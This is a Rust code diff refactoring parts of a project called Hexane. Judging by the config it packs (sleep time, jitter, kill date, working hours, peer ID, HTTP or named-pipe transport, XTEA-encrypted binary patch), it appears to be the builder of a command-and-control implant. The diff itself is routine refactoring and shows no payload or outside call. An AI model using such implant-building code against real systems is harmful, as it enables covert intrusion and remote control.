@@ -20,7 +20,7 @@ lazy_static!(
 
 pub(crate) fn load_instance(args: Vec<String>) -> Result<()> {
     if args.len() != 3 {
-        return_error!(format!("invalid input: {} arguments", args.len()))
+        return_error!("invalid input: {} arguments", args.len())
     }
 
     let mut instance = match crate::server::config::map_config(&args[2]) {
@@ -30,7 +30,10 @@ pub(crate) fn load_instance(args: Vec<String>) -> Result<()> {
 
     instance.check_config()?;
     instance.setup_instance()?;
-    instance.setup_listener()?;
+
+    if instance.network_type == *TRANSPORT_HTTP {
+        instance.setup_listener()?;
+    }
 
     let build_dir   = instance.compiler.build_directory.as_str();
     let name        = instance.builder.output_name.as_str();
@@ -43,7 +46,7 @@ pub(crate) fn load_instance(args: Vec<String>) -> Result<()> {
 }
 
 impl Hexane {
-    fn setup_instance(&mut self) -> Result<()> {
+    fn setup_self(&mut self) -> Result<()> {
         let mut rng = rand::thread_rng();
 
         if self.main.debug {
@@ -160,48 +163,50 @@ impl Hexane {
         Ok(())
     }
 
-    fn generate_config_bytes(instance: &mut Hexane) -> Result<()> {
-        instance.crypt_key = crypt_create_key(16);
+    fn generate_config_bytes(self: &mut Hexane) -> Result<()> {
+        self.crypt_key = crypt_create_key(16);
 
-        let mut patch = instance.create_binary_patch()?;
-        if instance.main.encrypt {
+        let mut patch = self.create_binary_patch()?;
+        if self.main.encrypt {
             let patch_cpy = patch.clone();
-            patch = crypt_xtea(&patch_cpy, &instance.crypt_key, true)?;
+            patch = crypt_xtea(&patch_cpy, &self.crypt_key, true)?;
         }
 
-        instance.config_data = patch;
+        self.config_data = patch;
         Ok(())
     }
 
-    fn create_binary_patch(instance: &Hexane) -> Result<Vec<u8>> {
+    fn create_binary_patch(&self) -> Result<Vec<u8>> {
         let mut stream = Stream::new();
 
-        match instance.network_type {
-            TRANSPORT_HTTP => stream.pack_byte(*TRANSPORT_HTTP),
-            TRANSPORT_PIPE => stream.pack_byte(*TRANSPORT_PIPE),
-            _ => return_error!("invalid network type"),
+        if self.network_type == *TRANSPORT_HTTP {
+            stream.pack_byte(*TRANSPORT_HTTP);
+        } else if self.network_type == *TRANSPORT_PIPE {
+            stream.pack_byte(*TRANSPORT_PIPE);
+        } else {
+            return_error!("invalid network type")
         }
 
-        stream.pack_bytes(&instance.crypt_key);
-        stream.pack_string(&instance.main.hostname);
+        stream.pack_bytes(&self.crypt_key);
+        stream.pack_string(&self.main.hostname);
 
-        stream.pack_dword(instance.peer_id);
-        stream.pack_dword(instance.main.sleeptime);
-        stream.pack_dword(instance.main.jitter);
+        stream.pack_dword(self.peer_id);
+        stream.pack_dword(self.main.sleeptime);
+        stream.pack_dword(self.main.jitter);
 
-        if let Some(ref modules) = instance.builder.loaded_modules {
+        if let Some(ref modules) = self.builder.loaded_modules {
             for module in modules {
                 stream.pack_string(module);
             }
         }
 
-        let working_hours = if let Some(ref hours) = instance.main.working_hours {
+        let working_hours = if let Some(ref hours) = self.main.working_hours {
             i32::from_str(hours).map_err(Error::ParseInt)?
         } else {
             0
         };
 
-        let kill_date = if let Some(ref date) = instance.main.killdate {
+        let kill_date = if let Some(ref date) = self.main.killdate {
             i64::from_str(date).map_err(Error::ParseInt)?
         } else {
             0
@@ -210,7 +215,7 @@ impl Hexane {
         stream.pack_int32(working_hours);
         stream.pack_dword64(kill_date);
 
-        match &instance.network.options {
+        match &self.network.options {
             NetworkOptions::Http(mut http) => {
                 stream.pack_wstring(&http.useragent.unwrap().as_str());
                 stream.pack_wstring(&http.address);
